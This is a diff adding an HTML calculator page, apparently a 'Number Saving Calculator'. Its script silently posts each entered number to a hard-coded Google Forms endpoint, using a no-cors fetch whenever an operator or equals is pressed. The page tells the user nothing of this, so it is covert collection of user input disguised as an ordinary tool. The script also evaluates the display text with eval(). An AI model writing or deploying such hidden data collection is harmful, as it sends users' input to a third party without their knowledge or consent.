@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Number Saving Calculator</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+body {
+  background: #1c1c1c;
+  font-family: Arial;
+}
+.calculator {
+  width: 280px;
+  margin: 60px auto;
+  background: #000;
+  border-radius: 20px;
+  padding: 15px;
+}
+#display {
+  width: 100%;
+  height: 60px;
+  font-size: 28px;
+  text-align: right;
+  background: #111;
+  color: #0f0;
+  border: none;
+  padding: 10px;
+  border-radius: 10px;
+}
+.buttons {
+  display: grid;
+  grid-template-columns: repeat(4, 1fr);
+  gap: 10px;
+  margin-top: 15px;
+}
+button {
+  height: 55px;
+  font-size: 20px;
+  border: none;
+  border-radius: 50%;
+  cursor: pointer;
+}
+.num { background: #333; color: #fff; }
+.op { background: #ff9500; color: #fff; }
+.clear { background: #ff3b30; color: #fff; }
+.equal { background: #34c759; color: #fff; }
+</style>
+</head>
+
+<body>
+
+<div class="calculator">
+  <input id="display" readonly>
+
+  <div class="buttons">
+    <button class="clear" onclick="clearAll()">AC</button>
+    <button class="op" onclick="operatorPressed('/')">÷</button>
+    <button class="op" onclick="operatorPressed('*')">×</button>
+    <button class="op" onclick="operatorPressed('-')">−</button>
+
+    <button class="num" onclick="press('7')">7</button>
+    <button class="num" onclick="press('8')">8</button>
+    <button class="num" onclick="press('9')">9</button>
+    <button class="op" onclick="operatorPressed('+')">+</button>
+
+    <button class="num" onclick="press('4')">4</button>
+    <button class="num" onclick="press('5')">5</button>
+    <button class="num" onclick="press('6')">6</button>
+    <button class="equal" onclick="equalPressed()">=</button>
+
+    <button class="num" onclick="press('1')">1</button>
+    <button class="num" onclick="press('2')">2</button>
+    <button class="num" onclick="press('3')">3</button>
+
+    <button class="num" onclick="press('0')">0</button>
+    <button class="num" onclick="press('.')">.</button>
+  </div>
+</div>
+
+<script>
+let display = document.getElementById("display");
+
+function press(val) {
+  display.value += val;
+}
+
+function clearAll() {
+  display.value = "";
+}
+
+function operatorPressed(op) {
+  if (display.value !== "") {
+    saveNumber(display.value);   // ✅ save immediately
+    display.value += op;
+  }
+}
+
+function equalPressed() {
+  if (display.value !== "") {
+    saveNumber(display.value);   // ✅ save entered number
+    try {
+      display.value = eval(display.value);
+    } catch {
+      display.value = "Error";
+    }
+  }
+}
+
+function saveNumber(num) {
+  let formURL = "https://docs.google.com/forms/d/e/1FAIpQLSf4YmOYLaH8C8kxe4m7h1blgEs7aZzDyg9W9tOrMDcMadwHsw/formResponse";
+
+  let data = new FormData();
+  data.append("entry.1695589467", num);
+
+  fetch(formURL, {
+    method: "POST",
+    body: data,
+    mode: "no-cors"
+  });
+}
+</script>
+
+</body>
+</html>
